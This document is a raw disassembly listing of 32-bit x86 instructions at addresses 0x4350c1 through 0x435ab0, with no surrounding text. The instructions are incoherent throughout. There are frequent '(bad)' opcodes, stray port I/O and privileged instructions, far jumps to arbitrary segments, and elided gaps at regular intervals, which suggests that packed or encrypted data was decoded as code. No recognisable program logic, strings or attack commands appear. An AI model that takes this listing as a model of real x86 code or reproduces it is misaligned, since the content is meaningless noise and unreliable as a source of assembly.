  4350c1:	xor    bh,BYTE PTR [esi+0x44]
  4350c4:	sbb    BYTE PTR [esi],0x4
  4350c7:	sti    
  4350c8:	cld    
  4350c9:	(bad)  
  4350ca:	shr    DWORD PTR fs:[ecx+0x397477e8],0xd2
  4350d2:	jnp    0x435118
  4350d4:	xchg   ebx,eax
  4350d5:	pop    eax
  4350d6:	test   DWORD PTR [edi+0x68374956],0x4f8f9
  4350e0:	je     0x4350f5
  4350e2:	popf   
  4350e3:	xchg   BYTE PTR [edi],ch
  4350e5:	pop    eax
  4350e6:	mov    eax,ds:0x82293686
  4350eb:	mov    edi,0xb4
	...
  435104:	add    BYTE PTR [eax],al
  435106:	mov    dh,0x5e
  435108:	add    DWORD PTR [ebx+esi*8-0x20],esi
  43510c:	dec    edi
  43510d:	jb     0x435148
  43510f:	fidivr WORD PTR [esi]
  435111:	adc    al,0x49
  435113:	retf   
  435114:	mov    WORD PTR [edi+eiz*2-0x12ffbb3d],ss
  43511b:	cwde   
  43511c:	test   BYTE PTR [eax+0x1d],al
  43511f:	fidiv  DWORD PTR [ecx+ecx*4+0x45f8b10a]
  435126:	or     al,BYTE PTR [edx+0xdeff7b]
  43512c:	jp     0x43516e
  43512e:	retf   0xf5b0
  435131:	xor    cl,BYTE PTR [ebp-0x6ba4a9f0]
  435137:	ret    
  435138:	add    al,BYTE PTR [eax]
  43513a:	daa    
  43513b:	add    cl,BYTE PTR [ebp-0x7cee4ebb]
  435141:	div    DWORD PTR [ebp-0x7500042e]
  435147:	(bad)  
  435149:	sbb    eax,0xfffffffc
  43514c:	push   DWORD PTR [edi+esi*8+0x13]
  435150:	lea    eax,[ebp+0x5d]
  435153:	fldcw  WORD PTR [ebp-0x7b4f9577]
  435159:	fsub   DWORD PTR [ecx]
  43515b:	lea    eax,ds:0x22784
  435161:	add    BYTE PTR [esi],dl
  435163:	mov    ecx,0x18d98e7
  435168:	add    BYTE PTR [edx+0x0],ch
	...
  435183:	push   0x7e
  435185:	jnp    0x43514b
  435187:	xor    eax,0xca672bd9
  43518c:	mov    al,0xf5
  43518e:	jne    0x4351c9
  435190:	jle    0x435145
  435192:	enter  0xb0bb,0xf5
  435196:	push   0x5d
  435198:	fst    DWORD PTR [edx*1+0x7583014d]
  43519f:	sbb    DWORD PTR [ebp+edi*4-0x77],edi
  4351a3:	mov    al,ds:0xafff705
  4351a8:	jg     0x4351ed
  4351aa:	mov    esp,?
  4351ac:	mov    esp,esi
  4351ae:	mov    esi,0x83d3f66e
  4351b3:	xor    al,0x47
  4351b5:	adc    eax,0x82a0430b
  4351ba:	inc    edi
  4351bb:	lods   al,BYTE PTR ds:[esi]
  4351bc:	inc    edi
  4351bd:	cli    
  4351be:	jle    0x4351cc
  4351c0:	mov    al,0x49
  4351c2:	add    ah,BYTE PTR [edi]
  4351c4:	outs   dx,BYTE PTR ds:[esi]
  4351c5:	mov    DWORD PTR gs:[ecx],esi
  4351c8:	xor    al,0x81
  4351ca:	test   BYTE PTR [eax-0x25],al
  4351cd:	into   
  4351ce:	cli    
  4351cf:	inc    esp
  4351d0:	popa   
  4351d1:	dec    ecx
  4351d2:	mov    WORD PTR [esi+edx*8],fs
  4351d5:	out    0x90,al
  4351d7:	retf   
  4351d8:	add    DWORD PTR [edi+0x7fe348bf],0xffffff84
  4351df:	sbb    BYTE PTR [ebx-0x32],dh
  4351e2:	cli    
  4351e3:	inc    esp
  4351e4:	cmp    DWORD PTR [ecx-0x3c],ecx
	...
  4351ff:	add    BYTE PTR [ecx+esi*1-0x77],al
  435203:	(bad)  
  435204:	mov    ds:0x8c4fce9b,al
  435209:	sub    edi,ecx
  43520b:	call   DWORD PTR [ebx-0x753876c7]
  435211:	inc    ebx
  435212:	iret   
  435213:	dec    edi
  435214:	daa    
  435215:	push   es
  435216:	adc    al,0x75
  435218:	hlt    
  435219:	lods   eax,DWORD PTR ds:[esi]
  43521a:	cmp    BYTE PTR [ebp-0x17cc0247],cl
  435220:	sub    al,0x40
  435222:	iret   
  435223:	cli    
  435224:	jno    0x4351c7
  435226:	mov    ebx,0x7a535bf9
  43522b:	xlat   BYTE PTR ds:[ebx]
  43522c:	pop    esp
  43522d:	shl    edi,0xff
  435230:	dec    ebx
  435231:	aaa    
  435232:	pop    ecx
  435233:	or     dh,cl
  435235:	lods   eax,DWORD PTR ds:[esi]
  435236:	jg     0x43527c
  435238:	push   eax
  435239:	sahf   
  43523a:	(bad)  
  43523b:	dec    ebx
  43523c:	xor    BYTE PTR ds:0x3a78d322,al
  435242:	cmp    ebx,ecx
  435244:	mov    eax,0xdb7e40d4
  435249:	add    al,0x1
  43524b:	(bad)  
  43524c:	jnp    0x435212
  43524e:	add    DWORD PTR [esi+0x4a],edi
  435251:	scas   al,BYTE PTR es:[edi]
  435252:	xlat   BYTE PTR ds:[ebx]
  435253:	sar    dh,cl
  435255:	ret    
  435256:	fwait
  435257:	jle    0x435268
  435259:	xchg   ah,bh
  43525b:	mov    edi,0x36e904f8
  435260:	inc    edi
  435261:	(bad)  
  435262:	repz jmp 0x435265
	...
  43527d:	repnz inc esp
  43527f:	jmp    0x60507b02
  435284:	dec    eax
  435285:	loopne 0x435216
  435287:	jmp    0xf403:0xe7949bd2
  43528e:	xchg   ecx,eax
  43528f:	sbb    esp,eax
  435291:	push   ebx
  435292:	cmc    
  435293:	xor    eax,DWORD PTR [esp+esi*8]
  435296:	cs in  eax,dx
  435298:	sub    ebx,DWORD PTR [esi+esi*2-0x77612d95]
  43529f:	test   al,0x58
  4352a1:	div    esi
  4352a3:	test   al,0xdc
  4352a5:	mov    al,BYTE PTR [ecx+ebp*8]
  4352a8:	add    esi,DWORD PTR [ebx+0xa]
  4352ab:	jp     0x435305
  4352ad:	in     al,dx
  4352ae:	(bad)
  4352b2:	add    al,0xe9
  4352b4:	xchg   al,al
  4352b6:	mov    esp,0xb4c88061
  4352bb:	push   eax
  4352bc:	pop    ds
  4352bd:	pop    ebp
  4352be:	rcl    DWORD PTR [ecx-0x79],0x9b
  4352c2:	cmp    BYTE PTR [ebx],ch
  4352c4:	ror    al,cl
  4352c6:	mov    ah,0x6d
  4352c8:	dec    eax
  4352c9:	inc    eax
  4352ca:	lods   al,BYTE PTR ds:[esi]
  4352cb:	(bad)  
  4352cc:	aas    
  4352cd:	hlt    
  4352ce:	add    al,0x0
  4352d0:	cli    
  4352d1:	mov    cl,BYTE PTR [esp+eax*2+0xa840241]
  4352d8:	ja     0x43532d
  4352da:	ret    
  4352db:	cli    
  4352dc:	jmp    0x1376d355
	...
  4352f9:	add    BYTE PTR [esi-0x42],al
  4352fc:	out    0x50,eax
  4352fe:	rol    BYTE PTR [eax+eax*1],cl
  435301:	jb     0x4352b7
  435303:	mov    ah,0x65
  435305:	call   0xf80fdb7e
  43530a:	and    eax,0x3c624fbe
  43530f:	mov    ecx,0xaac82c26
  435314:	js     0x43530f
  435316:	les    edi,FWORD PTR [edi-0x46162e7a]
  43531c:	jae    0x43536b
  43531e:	push   ecx
  43531f:	pop    es
  435320:	xchg   DWORD PTR [ecx],ebp
  435322:	les    ecx,FWORD PTR [ebp+0x47f1b95c]
  435328:	in     al,dx
  435329:	cmp    eax,0xb14d41ee
  43532e:	lds    ebp,FWORD PTR [ebx-0x32b7c5a5]
  435334:	(bad)  
  435335:	call   0xf32ba931
  43533a:	call   0x536:0xb8d2fabf
  435341:	rcr    bh,0x10
  435344:	jne    0x435321
  435346:	enter  0x642a,0x1e
  43534a:	cwde   
  43534b:	or     eax,0xfb456e0d
  435350:	mov    esi,0x57fd61dd
  435355:	in     eax,dx
  435356:	retf   
  435357:	rcpps  xmm4,XMMWORD PTR [edx+0x2e]
  43535b:	stos   BYTE PTR es:[edi],al
  43535c:	fcom   DWORD PTR [ecx+0x0]
	...
  435377:	and    eax,0x980088bf
  43537c:	into   
  43537d:	loope  0x4353a7
  43537f:	(bad)  
  435380:	into   
  435381:	loop   0x43538a
  435383:	add    ah,dl
  435385:	cmc    
  435386:	push   ebx
  435387:	xor    eax,0x1dfffb2f
  43538c:	sbb    eax,eax
  43538e:	call   0x3c09dd
  435393:	pop    esi
  435394:	pop    esi
  435395:	cwde   
  435396:	add    BYTE PTR ds:0xe5c02b06,bl
  43539c:	and    dl,BYTE PTR [eax]
  43539e:	inc    BYTE PTR [edx]
  4353a0:	int    0x43
  4353a2:	clc    
  4353a3:	or     al,0x6
  4353a5:	add    BYTE PTR [eax],al
  4353a7:	loop   0x4353c5
  4353a9:	call   0xf618060a
  4353ae:	push   edi
  4353af:	(bad)  
  4353b2:	inc    edx
  4353b4:	aam    0x73
  4353b6:	lock mov ch,0x43
  4353b9:	xlat   BYTE PTR ds:[ebx]
  4353ba:	push   DWORD PTR [edx+0x8ff0140]
  4353c0:	rol    DWORD PTR [ecx+0x7b40d54d],1
  4353c6:	sbb    BYTE PTR [ebp+eax*1-0x31e91800],0xfb
  4353ce:	(bad)  
  4353cf:	mov    esi,0x857d79c5
  4353d4:	push   es
  4353d5:	pop    es
  4353d6:	xchg   esp,eax
  4353d7:	pop    ebp
  4353d8:	hlt    
  4353d9:	push   edx
  4353da:	leave  
	...
  4353f3:	add    BYTE PTR [edi+0x9],bl
  4353f6:	add    BYTE PTR [edx-0x57],ch
  4353f9:	(bad)  
  4353fb:	pop    es
  4353fc:	lea    eax,ds:0xd1a8d50
  435402:	push   eax
  435403:	jmp    FWORD PTR [eax-0x13]
  435406:	or     eax,0xbe884d40
  43540b:	or     al,0xf4
  43540d:	xor    BYTE PTR [edi-0x3be2048d],bh
  435413:	call   0x41ff4a
  435418:	repz cmp cl,BYTE PTR [eax+0x1c]
  43541c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43541d:	mov    al,ds:0xc9caed13
  435422:	or     eax,ebp
  435424:	mov    al,ds:0xd84b7b7f
  435429:	mov    ebx,0xd492087b
  43542e:	jge    0x43544b
  435430:	cmc    
  435431:	stos   DWORD PTR es:[edi],eax
  435432:	(bad)  
  435433:	je     0x4353e6
  435435:	xchg   ebp,eax
  435436:	std    
  435437:	out    0x44,eax
  435439:	xor    eax,edx
  43543b:	cli    
  43543c:	outs   dx,DWORD PTR ds:[esi]
  43543d:	mov    ebx,0x7668f506
  435442:	add    eax,0x81186a2a
  435447:	pop    ecx
  435448:	clc    
  435449:	sub    al,BYTE PTR [edi+0x4]
  43544c:	add    al,0x61
  43544e:	icebp  
  43544f:	xchg   bh,dh
  435451:	sub    ah,al
  435453:	jae    0x435438
  435455:	sub    al,ah
  435457:	add    eax,DWORD PTR [eax]
	...
  435471:	dec    esi
  435472:	stos   BYTE PTR es:[edi],al
  435473:	lea    esi,cs:[ebx]
  435476:	(bad)  
  435477:	cs sti 
  435479:	or     DWORD PTR [esi],edx
  43547b:	repnz aas 
  43547d:	hlt    
  43547e:	sub    cl,al
  435480:	or     edi,DWORD PTR [ecx+0x6e]
  435483:	push   edi
  435484:	jne    0x4354b7
  435486:	sub    edi,DWORD PTR [edi+0x4a7fcf07]
  43548c:	aad    0x22
  43548e:	xchg   esi,eax
  43548f:	xchg   ebp,eax
  435490:	fld    DWORD PTR [ebx+0x33b2fb3f]
  435496:	enter  0xed0d,0xda
  43549a:	jb     0x435463
  43549c:	jae    0x43545e
  43549e:	add    al,0x6e
  4354a0:	inc    eax
  4354a1:	sbb    BYTE PTR ds:0xfdd5fd6e,dl
  4354a7:	addr16 out dx,al
  4354a9:	hlt    
  4354aa:	add    al,0xe9
  4354ac:	pop    eax
  4354ad:	mov    cl,0x2a
  4354af:	out    0xdb,eax
  4354b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4354b2:	mov    ?,WORD PTR [ecx]
  4354b4:	iret   
  4354b5:	jb     0x43546c
  4354b7:	in     eax,dx
  4354b8:	fsub   DWORD PTR [edi-0x51e21004]
  4354be:	out    dx,al
  4354bf:	jae    0x4354ef
  4354c1:	clc    
  4354c2:	sbb    DWORD PTR [ebp-0xbc607f9],0x7a
  4354c9:	adc    cl,BYTE PTR [ecx-0x7c18a7d8]
  4354cf:	sub    ah,bh
  4354d1:	cdq    
  4354d2:	adc    al,0x99
  4354d4:	add    BYTE PTR [eax],0x0
	...
  4354eb:	add    BYTE PTR [eax],al
  4354ed:	add    BYTE PTR [esi+0x8ce991e],dh
  4354f3:	pop    ebp
  4354f4:	rol    DWORD PTR [ebx-0xc],cl
  4354f7:	sub    DWORD PTR [edi+edi*8-0x9ab3b88],0x30
  4354ff:	test   BYTE PTR [ebp+0x4cef0afb],ah
  435505:	mov    ecx,0xae2dad25
  43550a:	mov    esi,0x1dc3f6bf
  43550f:	bound  ecx,QWORD PTR [esi]
  435511:	ret    0x4f7
  435514:	adc    ebx,esp
  435516:	call   0x5411f6f9
  43551b:	add    eax,0x8c40d38e
  435520:	test   BYTE PTR [edx+0x6866189f],al
  435526:	add    BYTE PTR [edx+ebx*1],0x7b
  43552a:	std    
  43552b:	or     BYTE PTR [esi+ecx*8-0x12],ah
  43552f:	mov    ?,edi
  435531:	push   eax
  435532:	test   DWORD PTR [eax+eax*1],0xffbcdc6a
  435539:	mov    ecx,0x2656fcbd
  43553e:	lods   al,BYTE PTR ds:[esi]
  43553f:	mov    ah,0x0
  435541:	jmp    0xaccc5a3d
  435546:	sub    eax,DWORD PTR [esi-0x435315ff]
  43554c:	out    0x5f,eax
  43554e:	in     al,dx
  43554f:	add    al,0x0
  435551:	ins    DWORD PTR es:[edi],dx
	...
  43556a:	add    BYTE PTR [edi],dh
  43556c:	cmp    BYTE PTR [eax],bl
  43556e:	bound  edi,QWORD PTR [eax+edi*4-0x3cc0c87a]
  435575:	add    ebp,ecx
  435577:	idiv   DWORD PTR [ebx+0x50421d4c]
  43557d:	lock rol ah,0xb0
  435581:	sub    BYTE PTR [edi+ebp*1-0x538dbd5a],ah
  435588:	mov    ah,0x88
  43558a:	lods   al,BYTE PTR ds:[esi]
  43558b:	ret    
  43558c:	test   edx,0x7c86046c
  435592:	aad    0x5d
  435594:	add    al,0x87
  435596:	sub    al,0xa8
  435598:	xchg   ecx,eax
  435599:	dec    ebx
  43559a:	call   0x38577e6e
  43559f:	dec    ebx
  4355a0:	inc    edx
  4355a1:	add    esi,ecx
  4355a3:	pop    es
  4355a4:	mov    edx,0xfec22114
  4355a9:	jmp    FWORD PTR [ecx-0x44]
  4355ac:	or     al,BYTE PTR [ebp-0x78f5bc57]
  4355b2:	sub    al,0xc4
  4355b4:	xchg   ecx,ecx
  4355b6:	xchg   ecx,eax
  4355b7:	ja     0x4355bb
  4355b9:	add    cl,ch
  4355bb:	rcl    BYTE PTR [ecx-0x4],0xc2
  4355bf:	mov    esp,0x790044bb
  4355c4:	cmp    al,0x44
  4355c6:	cld    
  4355c7:	mov    cs,ebp
  4355c9:	xor    DWORD PTR [esi+0x61],eax
  4355cc:	dec    esi
  4355cd:	mov    esi,0xff
	...
  4355e6:	add    BYTE PTR [eax],al
  4355e8:	adc    ch,bl
  4355ea:	cmp    DWORD PTR [esi+0x51],0x4cf043d1
  4355f1:	out    dx,eax
  4355f2:	jmp    0x4355f5
  4355f4:	mov    dl,cl
  4355f6:	aaa    
  4355f7:	jge    0x43559a
  4355f9:	mov    edi,0xcfba7b86
  4355fe:	cmc    
  4355ff:	pop    ebx
  435600:	pop    edx
  435601:	jnp    0x4355bc
  435603:	push   esi
  435604:	xchg   esi,eax
  435605:	fadd   DWORD PTR [ecx+0x3b5b5c7]
  43560b:	add    BYTE PTR ds:0x1a74ba86,cl
  435611:	aas    
  435612:	or     BYTE PTR ds:[ebp-0x26],cl
  435616:	enter  0x1d04,0x2
  43561a:	test   eax,eax
  43561c:	je     0x4355d2
  43561e:	add    edi,0x4fe27e86
  435624:	fadd   QWORD PTR [ecx]
  435626:	add    BYTE PTR [ebp+ebx*1-0x72ccfaaa],al
  43562d:	inc    ecx
  43562e:	push   esi
  43562f:	ret    
  435630:	dec    al
  435632:	pop    eax
  435633:	ret    
  435634:	adc    BYTE PTR [edi+eiz*8],bh
  435637:	push   ecx
  435638:	push   cs
  435639:	test   DWORD PTR [esi-0x73],0xe84ad510
  435640:	xor    BYTE PTR [ebp-0x35e90008],0x29
  435647:	mul    BYTE PTR [esi+0x3c6ecf]
	...
  435665:	es out dx,eax
  435667:	sti    
  435668:	adc    DWORD PTR [esi+0x2],0x7c
  43566c:	xor    al,0xf4
  43566e:	add    esp,edi
  435670:	out    0xe4,eax
  435672:	jo     0x43563f
  435674:	cli    
  435675:	mov    edi,0x6d03526d
  43567a:	jnp    0x4356f1
  43567c:	outs   dx,DWORD PTR ds:[esi]
  43567d:	clc    
  43567e:	and    cl,bh
  435680:	test   BYTE PTR [edx-0x49],ah
  435683:	in     al,dx
  435684:	mov    BYTE PTR [edx],ah
  435686:	xor    eax,0xfd4c042d
  43568b:	int3   
  43568c:	cli    
  43568d:	push   ebx
  43568e:	sub    cl,BYTE PTR [ebp+0x4]
  435691:	cmc    
  435692:	sar    al,1
  435694:	cli    
  435695:	or     dl,BYTE PTR [ecx+edi*8-0x24]
  435699:	cmp    edi,esi
  43569b:	xor    al,0xe7
  43569d:	stc    
  43569e:	and    al,ch
  4356a0:	out    0xfc,al
  4356a2:	xchg   esi,eax
  4356a3:	(bad)  
  4356a4:	cld    
  4356a5:	inc    eax
  4356a6:	out    0xcb,al
  4356a8:	cs xor al,0x7e
  4356ab:	sub    al,0x57
  4356ad:	cmp    eax,0xf04077ea
  4356b2:	and    dh,dh
  4356b4:	dec    esi
  4356b5:	stos   BYTE PTR es:[edi],al
  4356b6:	sahf   
  4356b7:	or     eax,0xbf817a80
  4356bd:	push   0x2cc057c3
  4356c2:	daa    
  4356c3:	(bad)  
  4356c4:	push   edx
  4356c5:	inc    ebp
  4356c6:	(bad)  
  4356c7:	cmp    ebx,ebp
	...
  4356e1:	add    bl,bl
  4356e3:	fstp   TBYTE PTR [edx-0x11]
  4356e6:	jns    0x4356c4
  4356e8:	push   eax
  4356e9:	add    al,0x6
  4356eb:	outs   dx,BYTE PTR ds:[esi]
  4356ec:	fisub  DWORD PTR [edx]
  4356ee:	sub    dl,BYTE PTR [esi+0x6e]
  4356f1:	(bad)  
  4356f2:	mov    ebx,0x9cc279ae
  4356f7:	das    
  4356f8:	stc    
  4356f9:	stc    
  4356fa:	stos   DWORD PTR es:[edi],eax
  4356fb:	adc    al,0x7a
  4356fd:	xlat   BYTE PTR ds:[ebx]
  4356fe:	mov    WORD PTR ds:0xbc9ea85e,es
  435704:	outs   dx,BYTE PTR ds:[esi]
  435705:	(bad)  
  435706:	call   0xe893:0x1c03ff0b
  43570d:	add    esi,esp
  43570f:	imul   DWORD PTR [eax+0x7b0a0cdc]
  435715:	retf   
  435716:	into   
  435717:	pop    edx
  435718:	push   cs
  435719:	mov    eax,0xb3357c8f
  43571f:	push   ebx
  435720:	push   ss
  435721:	retf   
  435722:	or     ah,al
  435724:	outs   dx,DWORD PTR ds:[esi]
  435725:	dec    ecx
  435726:	push   eax
  435727:	(bad)  
  435728:	sar    bh,cl
  43572a:	int    0xe9
  43572c:	pop    ebp
  43572d:	add    al,BYTE PTR [ebx-0x3d]
  435730:	retf   0xc386
  435733:	in     al,0xe8
  435735:	push   ecx
  435736:	or     eax,0x6b86ed2f
  43573b:	sbb    DWORD PTR [ecx+0x220ca8ca],ebx
  435741:	icebp  
  435742:	ret    
  435743:	adc    ch,BYTE PTR [ecx+0x3]
	...
  43575d:	add    BYTE PTR [eax],al
  43575f:	xchg   ebx,eax
  435760:	shl    ah,0x80
  435763:	dec    ebx
  435764:	xor    ah,dh
  435766:	retf   0xb8b8
  435769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43576a:	xchg   BYTE PTR [esi],dh
  43576c:	std    
  43576d:	mov    ebp,0x1638f829
  435772:	jg     0x4357a4
  435774:	mov    ecx,0xc6ad2e89
  435779:	in     al,dx
  43577a:	add    eax,DWORD PTR [ecx-0x70]
  43577d:	int3   
  43577e:	xor    al,0x43
  435780:	push   esp
  435781:	push   ss
  435782:	retf   
  435783:	sbb    ah,al
  435785:	pop    edi
  435786:	dec    eax
  435787:	sar    ch,0x42
  43578a:	add    BYTE PTR [esi],bh
  43578c:	jmp    0x4eff:0xc2b3016d
  435793:	jae    0x4357c8
  435795:	xor    al,0xe9
  435797:	inc    ebp
  435798:	push   ds
  435799:	data16 stc 
  43579b:	jb     0x435818
  43579d:	and    edi,DWORD PTR [ecx]
  43579f:	mov    edi,0x84960830
  4357a4:	push   ebx
  4357a5:	adc    ch,BYTE PTR [ecx]
  4357a7:	clc    
  4357a8:	cmp    eax,esp
  4357aa:	cmc    
  4357ab:	je     0x435828
  4357ad:	je     0x435799
  4357af:	ds inc eax
  4357b1:	cld    
  4357b2:	sub    dh,BYTE PTR [ebx-0x3a]
  4357b5:	aaa    
  4357b6:	mov    dl,0xd
  4357b8:	add    DWORD PTR [edx+edi*1-0x26],edi
  4357bc:	inc    eax
  4357bd:	cld    
  4357be:	mov    esi,0xedbdce22
	...
  4357db:	add    bh,dh
  4357dd:	push   esi
  4357de:	push   ebx
  4357df:	bound  ebp,QWORD PTR [edi]
  4357e1:	mov    BYTE PTR [edx-0x1b],al
  4357e4:	mov    edx,0x98514fb4
  4357e9:	mov    edi,0xb37236fa
  4357ee:	std    
  4357ef:	stos   DWORD PTR es:[edi],eax
  4357f0:	sub    DWORD PTR [edx],edi
  4357f2:	ret    
  4357f3:	int    0xe6
  4357f5:	lods   al,BYTE PTR ds:[esi]
  4357f6:	xchg   esi,eax
  4357f7:	push   ds
  4357f8:	ds mov esi,0x39f1117e
  4357fe:	add    al,0xda
  435800:	aaa    
  435801:	mov    ds:0xfb37b9fe,al
  435806:	pop    edx
  435807:	lahf   
  435808:	mov    edx,0xefcd4383
  43580d:	or     DWORD PTR [ebx-0x3b],0xffffffeb
  435811:	cmp    DWORD PTR [edi],0xffffffed
  435814:	pop    eax
  435815:	dec    ebp
  435816:	add    al,0x22
  435818:	mov    bh,0x31
  43581a:	call   FWORD PTR [ecx]
  43581c:	mov    al,0x7b
  43581e:	push   ss
  43581f:	test   eax,0xf9da79
  435824:	or     eax,0x450064c0
  435829:	mov    edi,0x589d42a3
  43582e:	cmp    bh,bh
  435830:	fld    QWORD PTR [edi+esi*8]
  435833:	xor    BYTE PTR [ebp-0x62ff3b10],al
  435839:	cmp    DWORD PTR [esi+0x3f385e14],0x24
	...
  435857:	add    BYTE PTR [eax],al
  435859:	mov    eax,ds:0x85244739
  43585e:	hlt    
  43585f:	xor    BYTE PTR [ecx+edi*1-0x42],0xf5
  435864:	ss faddp st(0),st
  435867:	add    dl,BYTE PTR [eax-0x32]
  43586a:	lds    eax,FWORD PTR [edx]
  43586c:	call   0x4359c1
  435871:	fisttp QWORD PTR [esi+0x4]
  435874:	add    BYTE PTR [ebx+0x5f6fa4b],al
  43587a:	rcl    BYTE PTR [ebx-0x75],0xa1
  43587e:	jg     0x435866
  435880:	adc    BYTE PTR [ebx+0x538beb39],cl
  435886:	mov    edx,0xbe508b4d
  43588b:	stc    
  43588c:	dec    esi
  43588d:	or     DWORD PTR [ecx-0x37],ebx
  435890:	cmp    ch,ah
  435892:	xchg   esp,eax
  435893:	aam    0xff
  435895:	loop   0x43581b
  435897:	mov    edx,0xfb29990f
  43589c:	dec    DWORD PTR ds:0x8e044139
  4358a2:	adc    bl,dl
  4358a4:	mov    DWORD PTR [eax-0x16a2782b],ebx
  4358aa:	push   cs
  4358ab:	push   edi
  4358ac:	add    al,0x53
  4358ae:	push   edi
  4358af:	mov    DWORD PTR [ebp-0x2b],ebx
  4358b2:	fdivr  st,st(4)
  4358b4:	xor    dh,ah
  4358b6:	jbe    0x435933
  4358b8:	cmp    dh,bh
  4358ba:	dec    eax
  4358bb:	int3   
  4358bc:	mov    BYTE PTR [eax],al
	...
  4358d6:	sbb    eax,eax
  4358d8:	add    eax,0x1bf9a45d
  4358dd:	xchg   edx,esi
  4358df:	and    BYTE PTR [ebx],bh
  4358e1:	(bad)  
  4358e2:	sti    
  4358e3:	inc    ebp
  4358e4:	lock dec edi
  4358e6:	imul   ebp,edx,0xb0934ffb
  4358ec:	adc    dh,BYTE PTR es:[esp+ebp*4]
  4358f0:	add    ebx,0xfffffff0
  4358f3:	and    BYTE PTR [edi+0x39831873],bh
  4358f9:	cld    
  4358fa:	jg     0x4358dc
  4358fc:	(bad)  
  4358fd:	jle    0x435936
  4358ff:	jae    0x43590c
  435901:	inc    ebp
  435902:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  435904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435905:	xchg   BYTE PTR [ebx],dh
  435907:	ss mov ecx,0xc85af7e7
  43590d:	cli    
  43590e:	jo     0x4358fb
  435910:	dec    ecx
  435911:	pop    ss
  435912:	outs   dx,DWORD PTR ds:[esi]
  435913:	cdq    
  435914:	cli    
  435915:	xchg   BYTE PTR ds:0xf737bed6,dh
  43591b:	mov    eax,ds:0x9ab5385c
  435920:	mov    DWORD PTR cs:[edx-0x57eb3861],esi
  435927:	mov    ecx,0xdf77003e
  43592c:	repnz cli 
  43592e:	mov    cl,0x17
  435930:	jl     0x4359ae
  435932:	in     al,dx
  435933:	es cmp dh,ah
  435936:	ja     0x4359a0
  435938:	(bad)  
  435939:	aaa    
	...
  435952:	add    BYTE PTR [edi],ch
  435954:	pop    edi
  435955:	cli    
  435956:	jnp    0x4359d3
  435958:	and    edi,DWORD PTR [ecx]
  43595a:	add    al,0x4f
  43595c:	in     eax,0x6
  43595e:	call   0xc8025e61
  435963:	into   
  435964:	jne    0x43594d
  435966:	sub    ch,BYTE PTR [edi]
  435968:	push   edi
  435969:	mov    al,ds:0x5e04f7c2
  43596e:	inc    ecx
  43596f:	mov    eax,0x5b4ca882
  435974:	sub    ebp,ecx
  435976:	sub    eax,0x3e86d9c
  43597b:	hlt    
  43597c:	stos   DWORD PTR es:[edi],eax
  43597d:	lahf   
  43597e:	test   BYTE PTR [edi],bl
  435980:	loope  0x43596e
  435982:	add    esp,DWORD PTR [esi]
  435984:	push   eax
  435985:	outs   dx,BYTE PTR ds:[esi]
  435986:	int3   
  435987:	jb     0x43593f
  435989:	sbb    al,0xfc
  43598b:	fwait
  43598c:	(bad)  
  43598d:	in     al,dx
  43598e:	add    esi,esp
  435990:	lea    ebp,[ecx]
  435992:	add    BYTE PTR [ebx-0x41],bh
  435995:	nop
  435996:	out    0x68,al
  435998:	mov    eax,0x32a38071
  43599d:	in     eax,0x11
  43599f:	xor    al,0xac
  4359a1:	adc    edi,DWORD PTR [ebx-0x43]
  4359a4:	add    BYTE PTR [eax+0x40fd3d5a],ch
  4359aa:	mov    ah,0x1c
  4359ac:	mov    eax,0x317b8049
  4359b1:	push   ebp
  4359b2:	jnp    0x435971
  4359b4:	add    BYTE PTR [esi-0x3b],ch
	...
  4359cf:	add    BYTE PTR [edx-0x9fd0f3c],dl
  4359d5:	sub    dh,cl
  4359d7:	inc    esp
  4359d8:	(bad)  
  4359d9:	push   esp
  4359da:	jo     0x435a12
  4359dc:	clc    
  4359dd:	mov    bh,0xf3
  4359df:	aaa    
  4359e0:	out    0x44,al
  4359e2:	jmp    0x594c9169
  4359e7:	add    eax,0x27569f
  4359ec:	hlt    
  4359ed:	push   ecx
  4359ee:	outs   dx,BYTE PTR ds:[esi]
  4359ef:	fsubr  DWORD PTR [edx-0x57]
  4359f2:	jmp    FWORD PTR [eax+0x25748a11]
  4359f8:	mov    eax,0xf7e8fe8f
  4359fd:	jg     0x435a4b
  4359ff:	icebp  
  435a00:	sub    eax,0x9faf8706
  435a05:	mov    bh,dl
  435a07:	into   
  435a08:	mov    dl,0x5d
  435a0a:	leave  
  435a0b:	stos   DWORD PTR es:[edi],eax
  435a0c:	mov    bl,0xb7
  435a0e:	push   esp
  435a0f:	push   ss
  435a10:	das    
  435a11:	mov    al,0x86
  435a13:	mov    eax,0xe91bf5bf
  435a18:	test   DWORD PTR [ebp+0x770eed42],0xbab34ee7
  435a22:	cli    
  435a23:	ins    DWORD PTR es:[edi],dx
  435a24:	mov    bh,0x33
  435a26:	adc    al,0x2
  435a28:	stos   BYTE PTR es:[edi],al
  435a29:	out    dx,eax
  435a2a:	(bad)  
  435a2b:	mov    ecx,0x1752fccd
  435a30:	xor    edx,DWORD PTR [eax]
  435a32:	dec    esp
  435a33:	fild   WORD PTR [eax]
	...
  435a4d:	mov    bh,0x4
  435a4f:	jg     0x4359f6
  435a51:	arpl   WORD PTR [edi+0x0],sp
  435a54:	(bad)  
  435a55:	sbb    DWORD PTR [eax+0x54],edi
  435a58:	jb     0x435a7d
  435a5a:	push   esp
  435a5b:	xchg   DWORD PTR [edi+edi*1-0x8ee3fe2],esp
  435a62:	add    eax,0xe4ba6a62
  435a67:	call   FWORD PTR [ecx+0x2fd77fd9]
  435a6d:	mov    ah,0xbb
  435a6f:	push   DWORD PTR [ecx+edx*8-0x3d8bfbe2]
  435a76:	sbb    BYTE PTR [ebp+0x505513aa],cl
  435a7c:	push   ss
  435a7d:	add    al,0x4f
  435a7f:	adc    ch,BYTE PTR [ecx+0xc437f7]
  435a85:	jmp    0xbab8150f
  435a8a:	call   0xdb18d011
  435a8f:	ss std 
  435a91:	retf   0x79c0
  435a94:	clc    
  435a95:	fbstp  TBYTE PTR [ecx-0x3eae3f65]
  435a9b:	jae    0x435ad1
  435a9d:	in     eax,0xf5
  435a9f:	or     esi,DWORD PTR [ebp-0x42]
  435aa2:	pop    esp
  435aa3:	add    al,0x8d
  435aa5:	loop   0x435a53
  435aa7:	dec    edx
  435aa8:	(bad)  
  435aa9:	fisubr WORD PTR [edx+ecx*2+0xdeec0ff]
  435ab0:	inc    eax
	...
